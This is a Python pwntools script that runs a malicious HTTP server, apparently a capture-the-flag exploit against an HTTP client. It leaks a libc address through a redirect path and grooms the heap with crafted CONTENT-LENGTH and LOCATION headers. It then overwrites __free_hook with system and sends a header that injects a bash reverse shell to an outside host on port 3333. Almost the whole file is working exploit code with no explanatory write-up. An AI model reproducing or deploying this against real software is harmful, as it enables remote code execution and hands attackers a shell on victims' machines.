#!/usr/bin/env python
import socketserver
from pwn import *

libc = ELF('./libc-2.27.so')

class TCPHandler(socketserver.BaseRequestHandler):
    def recvuntil(self, delim):
        data = ''
        while not data.endswith(delim):
            data += self.request.recv(1)
        return data

    def recvline(self):
        return self.recvuntil('\n')[:-1]

    def send(self, data):
        self.request.send(data)
        time.sleep(0.1)

    def send_header(self, key, value):
        self.send('%s: %s\r\n' % (key, value))

    def close(self):
        self.send('\r\n')
        self.request.close()

    def handle(self):
        path = self.recvline().split(' ')[1]
        if path == '/1':
            self.send_header('CONTENT-LENGTH', str(0x6a7))
            self.send_header('LOCATION', '/')
            self.send_header('CONTENT-LENGTH', str(0x8))
            self.send_header('LOCATION', '/' + '2' * 7)
            self.close()
        elif path.startswith('/2'):
            libc.address = u64(path[8:].ljust(8, '\0')) - 0x3ebca0
            log.info('libc base: %#x' % libc.address)
            self.send_header('CONTENT-LENGTH', str(0x17))
            self.send_header('CONTENT-LENGTH', str(0x17))
            self.send_header('CONTENT-LENGTH', str(0x597))
            self.send_header('LOCATION', '/' * 0x17)
            self.send_header('CONTENT-LENGTH', str(0x557))
            self.send_header('LOCATION', '/' * 0x17)
            self.send_header('CONTENT-LENGTH', str(0x17))
            self.send_header('LOCATION', '/' * 0x27)
            self.send_header('LOCATION', '/' * 0x27)
            self.send_header('CONTENT-LENGTH', str(0x77))
            self.send_header('LOCATION', '/')
            self.send_header('CONTENT-LENGTH', str(0x447))
            self.send_header('LOCATION', '/' * 0x1f + p64(libc.symbols['__free_hook'] - 8)[:6])
            self.send_header('CONTENT-LENGTH', str(0x17))
            self.send_header('CONTENT-LENGTH', str(0x17))
            self.send_header('LOCATION', '/' * 8 + p64(libc.symbols['system'])[:6])
            self.send_header('LOCATION', "/;bash -c 'sh < /dev/tcp/XXX.XXX.XXX.XXX/3333 >&0 2>&0';")
            self.close()

server = socketserver.TCPServer(('localhost', 1234), TCPHandler)
server.serve_forever()
